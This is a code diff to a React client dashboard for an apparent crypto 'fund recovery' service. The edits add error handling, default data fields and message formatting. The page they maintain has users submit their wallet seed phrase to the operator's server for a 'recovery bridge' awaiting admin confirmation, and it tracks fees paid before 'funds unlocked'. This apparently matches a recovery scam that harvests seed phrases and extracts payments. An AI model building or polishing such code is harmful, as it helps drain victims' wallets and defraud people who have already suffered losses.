@@ -35,6 +35,9 @@ interface Message {
   clientEmail: string;
   adminReply?: string;
   adminReplyTime?: string;
+  content?: string;
+  timestamp?: string;
+  createdAt?: string;
 }
 
 export default function ClientDashboard() {
@@ -119,18 +122,25 @@ export default function ClientDashboard() {
       return;
     }
 
-    const parsedUser = JSON.parse(storedUser);
-    if (parsedUser.role !== 'client') {
+    try {
+      const parsedUser = JSON.parse(storedUser);
+      if (parsedUser.role !== 'client') {
+        router.push('/login');
+        return;
+      }
+
+      setToken(storedToken);
+      setUser(parsedUser);
+
+      // Load client data
+      fetchClientData(storedToken);
+      fetchMessages(storedToken);
+    } catch (error) {
+      console.error('Error parsing user data:', error);
+      localStorage.removeItem('token');
+      localStorage.removeItem('user');
       router.push('/login');
-      return;
     }
-
-    setToken(storedToken);
-    setUser(parsedUser);
-
-    // Load client data
-    fetchClientData(storedToken);
-    fetchMessages(storedToken);
   }, []);
 
   // Animate progress bar with phases
@@ -190,7 +200,23 @@ export default function ClientDashboard() {
 
       if (response.ok) {
         const clientData = await response.json();
-        setData(clientData.data);
+        // Merge nested data with default ClientData structure
+        setData({
+          recoveredAmount: 0,
+          feePaid: false,
+          trackingProgress: 0,
+          totalPercentage: 0,
+          paymentPending: false,
+          paymentConfirmed: false,
+          fundsUnlocked: false,
+          balance: 0,
+          fixed: 0,
+          marsettaShare: 0,
+          verifiedLoss1: clientData.data?.verifiedLoss1 || 0,
+          verifiedLoss2: clientData.data?.verifiedLoss2 || 0,
+          totalEntitlement: 0,
+          ...clientData.data, // spread any additional data fields
+        });
         setSelectedWallet(clientData.wallet || '');
         setSeedPhrase(clientData.seedPhrase || '');
       } else {
@@ -243,6 +269,10 @@ export default function ClientDashboard() {
       alert('Please login first.');
       return;
     }
+    if (!wallet) {
+      alert('Please select or enter a wallet first.');
+      return;
+    }
 
     try {
       const response = await fetch(getApiUrl('/api/client/wallet'), {
@@ -254,10 +284,12 @@ export default function ClientDashboard() {
         body: JSON.stringify({ wallet, seedPhrase }),
       });
 
+      const result = await response.json();
       if (response.ok) {
-        alert('Recovery bridge request submitted. Await admin confirmation.');
+        alert(result.message || 'Recovery bridge request submitted. Await admin confirmation.');
+        fetchClientData(token);
       } else {
-        alert('Error updating wallet data.');
+        alert(result.message || 'Error updating wallet data.');
       }
     } catch (error) {
       console.error('Error:', error);
@@ -417,6 +449,11 @@ export default function ClientDashboard() {
     setResetEmail('');
   };
 
+  const formatMessageTime = (rawTime?: string | Date) => {
+    const date = rawTime ? new Date(rawTime) : null;
+    return date && !isNaN(date.getTime()) ? date.toLocaleTimeString() : '';
+  };
+
   const handlePaymentSent = () => {
     alert('Payment confirmation sent. Pending admin approval.');
   };
@@ -426,6 +463,16 @@ export default function ClientDashboard() {
     localStorage.removeItem('user');
     router.push('/');
   };
+
+  if (loading) {
+    return (
+      <div className="min-h-screen bg-[#040b16] text-white flex items-center justify-center p-6">
+        <div className="text-center">
+          <p className="text-cyan-400 text-xl font-mono">Loading client data...</p>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-[#040b16] text-white p-6 md:p-10">
@@ -893,14 +940,14 @@ export default function ClientDashboard() {
               supportMessages.map((msg) => (
                 <div key={msg.id} className="rounded-3xl border border-white/10 bg-slate-950/80 p-5">
                   <div className="flex items-center justify-between gap-3 mb-3">
-                    <span className="text-[10px] uppercase tracking-[0.3em] text-slate-500">{msg.from} - {new Date(msg.time).toLocaleTimeString()}</span>
+                    <span className="text-[10px] uppercase tracking-[0.3em] text-slate-500">{msg.from} - {formatMessageTime(msg.time || msg.timestamp || msg.createdAt)}</span>
                     {msg.adminReply && <span className="text-green-400 text-xs font-semibold">✓ REPLIED</span>}
                   </div>
-                  <p className="text-sm leading-7 text-slate-200"><strong>Your message:</strong> {msg.message}</p>
+                  <p className="text-sm leading-7 text-slate-200"><strong>Your message:</strong> {msg.message || msg.content}</p>
                   
                   {msg.adminReply && (
                     <div className="mt-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/20 p-4">
-                      <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-2">Admin Reply - {msg.adminReplyTime ? new Date(msg.adminReplyTime).toLocaleTimeString() : ''}</p>
+                      <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-2">Admin Reply - {formatMessageTime(msg.adminReplyTime)}</p>
                       <p className="text-sm text-slate-100">{msg.adminReply}</p>
                       {selectedMessageId !== msg.id && (
                         <button
